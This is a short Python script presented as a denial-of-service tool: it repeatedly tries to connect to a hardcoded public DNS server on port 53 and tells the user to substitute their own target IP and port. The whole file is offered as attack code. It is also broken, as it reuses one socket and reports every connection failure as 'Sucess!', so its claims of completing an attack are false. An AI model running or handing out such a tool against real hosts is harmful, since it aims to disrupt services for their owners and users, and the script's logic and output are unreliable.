import socket
import time

print("Change the IP and Port in the code.")
time.sleep(1)

def dos():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ip = "8.8.4.4" 
    port = 53
    for _ in range(1000):
        try:
            s.connect((ip,port))
        except Exception as e:
            print(f"Sucess! ({e})")
            
dos()

print("Dos Complete")
print("Restart tool to dos again!")
time.sleep(100)
